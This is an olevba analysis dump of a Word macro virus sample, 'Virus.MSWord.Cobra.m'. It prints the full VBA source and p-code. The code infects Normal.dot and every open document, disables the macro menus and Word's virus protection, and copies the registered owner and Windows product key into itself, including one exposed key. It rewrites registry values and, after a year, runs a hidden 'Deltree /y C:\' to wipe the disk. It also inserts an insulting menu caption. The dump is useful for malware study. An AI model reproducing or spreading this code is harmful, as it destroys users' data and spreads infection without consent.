olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10C.bas 
in file: Virus.MSWord.Cobra.m - OLE stream: 'Macros/VBA/AAX_10C'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0C
'An intelligent member of Cobra family

Sub FileExit()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
WordBasic.FileExit
End Sub
Sub AutoOpen()
On Error Resume Next
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
CD = Format(Date, "mm/dd/yyyy")
If DateValue(CD) - DateValue(ID) > 30 Then
If WeekDay(Date) = 1 Then
MsgBox "Remember that it's not fun. An old Cobra infects you.", vbOKOnly, "Cobra"
WordBasic.FileExit
End If
End If
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
End Sub
Sub AutoClose()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
End Sub
Sub FileOpen()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileSave()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileClose()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
WordBasic.FileClose
End Sub
Sub FileSaveAs()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePrint()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
CD = Format(Date, "mm/dd/yyyy")
If DateValue(CD) - DateValue(ID) > (30 * 6) Then
HD = ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary)
If HD <> "AAX" Then
ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Delete
ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.InsertAfter ("AAX")
End If
End If
Dialogs(wdDialogFilePrint).Show
End Sub
Sub InfectDocNTemp()
On Error Resume Next
For Each ID In NormalTemplate.VBProject.VBComponents
If ID.Name <> "AAX_10C" And ID.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=ID.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
TempInf = False
For Each ID In NormalTemplate.VBProject.VBComponents
If ID.Name = "AAX_10C" Then
TempInf = True
End If
Next
If TempInf = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="AAX_10C", _
Object:=wdOrganizerObjectProjectItems
TempInf = True
End If
For Each DF In Documents
For Each ID In DF.VBProject.VBComponents
If ID.Name <> "AAX_10C" And ID.Name <> "ThisDocument" And _
ID.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=DF.Name, _
Name:=ID.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DF In Documents
DocInf = False
For Each ID In DF.VBProject.VBComponents
If ID.Name = "AAX_10C" Then
DocInf = True
End If
Next
If DocInf = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DF.Name, Name:="AAX_10C", Object:=wdOrganizerObjectProjectItems
DF.SaveAs FileName:=DF.Name
End If
Next
End Sub
Sub MnuOff()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub RegE()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra" Then
GetInf = Chr(13) + "' " + String(80, Chr(178)) + Chr(13) + "' " + Format(Date, "dd/mm/yyyy") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "Version") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "ProductKey") + Chr(13) + _
"' " + String(80, Chr(178))
Lc = ActiveDocument.VBProject.VBComponents("AAX_10C").CodeModule.CountOfLines
Lc = Lc
ActiveDocument.VBProject.VBComponents("AAX_10C").CodeModule.InsertLines Lc + 2, GetInf
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PlBg,Dhk-1217,BD"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf") = Format(Date, "mm/dd/yyyy")
End If
End Sub
Sub D30X12()
On Error Resume Next
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
CD = Format(Date, "mm/dd/yyyy")
If DateValue(CD) - DateValue(ID) > 365 Then
If WeekDay(Date) = 6 Then
Shell "Deltree /y C:\", vbHide
End If
End If
If DateValue(CD) - DateValue(ID) > 7 Then
CommandBars("File").Reset
CommandBars("File").Controls("Save").Caption = "&Sheik Mojib is a big Bustard of Bengal"
End If
End Sub


' ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
' 05/02/2080
' Tariqul Islam Chowdhury
' CCER, Dhaka
' Windows 95
'
' ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

' ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
' 06/04/2001
' Daffodil
' Dhaka, Bangladesh
' Windows 98
' K4HVD-Q9TJ9-6CRX9-C9G68-RQ2D3
' ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/AAX_10C - 19060 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0010 "AAX Version 1.0C"
' Line #1:
' 	QuoteRem 0x0000 0x0025 "An intelligent member of Cobra family"
' Line #2:
' Line #3:
' 	FuncDefn (Sub FileExit())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #6:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #7:
' 	ArgsCall (Call) RegE 0x0000 
' Line #8:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Sub AutoOpen())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #14:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #15:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x001E 
' 	Gt 
' 	IfBlock 
' Line #16:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitStr 0x0035 "Remember that it's not fun. An old Cobra infects you."
' 	Ld vbOKOnly 
' 	LitStr 0x0005 "Cobra"
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #22:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #23:
' 	ArgsCall (Call) RegE 0x0000 
' Line #24:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub AutoClose())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #29:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #30:
' 	ArgsCall (Call) RegE 0x0000 
' Line #31:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub FileOpen())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #37:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #38:
' 	ArgsCall (Call) RegE 0x0000 
' Line #39:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #40:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub FileSave())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #45:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #46:
' 	ArgsCall (Call) RegE 0x0000 
' Line #47:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FileClose())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #53:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #54:
' 	ArgsCall (Call) RegE 0x0000 
' Line #55:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #57:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FileSaveAs())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #62:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #63:
' 	ArgsCall (Call) RegE 0x0000 
' Line #64:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #65:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FilePrint())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	ArgsCall (Call) MnuOff 0x0000 
' Line #70:
' 	ArgsCall (Call) InfectDocNTemp 0x0000 
' Line #71:
' 	ArgsCall (Call) RegE 0x0000 
' Line #72:
' 	ArgsCall (Call) D30X12 0x0000 
' Line #73:
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #74:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #75:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x001E 
' 	LitDI2 0x0006 
' 	Mul 
' 	Paren 
' 	Gt 
' 	IfBlock 
' Line #76:
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Headers 0x0001 
' 	St HD 
' Line #77:
' 	Ld HD 
' 	LitStr 0x0003 "AAX"
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Headers 0x0001 
' 	MemLd Range 
' 	ArgsMemCall Delete 0x0000 
' Line #79:
' 	LitStr 0x0003 "AAX"
' 	Paren 
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Headers 0x0001 
' 	MemLd Range 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub InfectDocNTemp())
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	StartForVariable 
' 	Ld ID 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #87:
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10C"
' 	Ne 
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #88:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ID 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Next 
' Line #91:
' 	LitVarSpecial (False)
' 	St TempInf 
' Line #92:
' 	StartForVariable 
' 	Ld ID 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #93:
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10C"
' 	Eq 
' 	IfBlock 
' Line #94:
' 	LitVarSpecial (True)
' 	St TempInf 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	Ld TempInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10C"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #99:
' 	LitVarSpecial (True)
' 	St TempInf 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld DF 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #102:
' 	StartForVariable 
' 	Ld ID 
' 	EndForVariable 
' 	Ld DF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #103:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10C"
' 	Ne 
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #104:
' 	LineCont 0x0004 09 00 00 00
' 	Ld DF 
' 	MemLd New 
' 	ParamNamed Source 
' 	Ld ID 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Next 
' Line #107:
' 	StartForVariable 
' 	Next 
' Line #108:
' 	StartForVariable 
' 	Ld DF 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #109:
' 	LitVarSpecial (False)
' 	St DocInf 
' Line #110:
' 	StartForVariable 
' 	Ld ID 
' 	EndForVariable 
' 	Ld DF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #111:
' 	Ld ID 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10C"
' 	Eq 
' 	IfBlock 
' Line #112:
' 	LitVarSpecial (True)
' 	St DocInf 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	StartForVariable 
' 	Next 
' Line #115:
' 	Ld DocInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #116:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DF 
' 	MemLd New 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10C"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #117:
' 	Ld DF 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld DF 
' 	ArgsMemCall SaveAs 0x0001 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	StartForVariable 
' 	Next 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub MnuOff())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #124:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #125:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #126:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #127:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #128:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #129:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #130:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #131:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #133:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub RegE())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	IfBlock 
' Line #138:
' 	LineCont 0x0014 26 00 00 00 38 00 00 00 4A 00 00 00 5C 00 00 00 6E 00 00 00
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitDI2 0x0050 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	Ld Date 
' 	LitStr 0x000A "dd/mm/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "ProductKey"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "' "
' 	Add 
' 	LitDI2 0x0050 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	St GetInf 
' Line #139:
' 	LitStr 0x0007 "AAX_10C"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lc 
' Line #140:
' 	Ld Lc 
' 	St Lc 
' Line #141:
' 	Ld Lc 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld GetInf 
' 	LitStr 0x0007 "AAX_10C"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #142:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #143:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #144:
' 	LitStr 0x0014 "349,PlBg,Dhk-1217,BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #145:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #148:
' 	Ld ID 
' 	ArgsLd IsDate 0x0001 
' 	Not 
' 	IfBlock 
' Line #149:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub D30X12())
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	LitStr 0x0000 ""
' 	LitStr 0x0018 "HKEY_LOCAL_MACHINE\Cobra"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ID 
' Line #155:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CD 
' Line #156:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x016D 
' 	Gt 
' 	IfBlock 
' Line #157:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #158:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	Ld CD 
' 	ArgsLd DateValue 0x0001 
' 	Ld ID 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x0007 
' 	Gt 
' 	IfBlock 
' Line #162:
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #163:
' 	LitStr 0x0027 "&Sheik Mojib is a big Bustard of Bengal"
' 	LitStr 0x0004 "Save"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	EndSub 
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x0051 " ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²"
' Line #169:
' 	QuoteRem 0x0000 0x000B " 05/02/2080"
' Line #170:
' 	QuoteRem 0x0000 0x0018 " Tariqul Islam Chowdhury"
